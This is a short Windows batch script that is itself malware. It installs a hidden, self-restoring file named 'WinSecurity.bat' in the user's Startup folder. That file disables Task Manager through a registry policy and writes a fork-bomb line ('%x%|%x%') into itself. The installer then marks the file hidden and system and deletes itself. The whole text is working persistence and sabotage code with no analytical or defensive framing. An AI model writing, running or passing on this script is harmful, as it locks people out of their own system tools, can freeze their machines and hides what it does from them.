@echo off
setlocal enabledelayedexpansion

:: Get Startup folder path dynamically
for /f "delims=" %%a in ('powershell -C "$env:APPDATA + '\Microsoft\Windows\Start Menu\Programs\Startup\'"') do set "s=%%a"

:: Set hidden filename
set "h=WinSecurity.bat"

:: Create the persistence script
(
    echo @echo off
    echo reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f
    echo :loop
    echo if not exist "%~f0" (
    echo     echo @echo off ^> "%~f0"
    echo     echo reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f ^>^> "%~f0"
    echo     echo set "x=%%0" ^>^> "%~f0"
    echo     echo %%x%%^|%%x%% ^>^> "%~f0"
    echo     attrib +h +s "%~f0"
    echo )
    echo timeout /t 5 /nobreak >nul
    echo goto loop
) > "!s!\!h!"

:: Hide the file as System + Hidden
attrib +h +s "!s!\!h!"

:: Delete itself permanently
(del /f /q "%~f0" & exit)
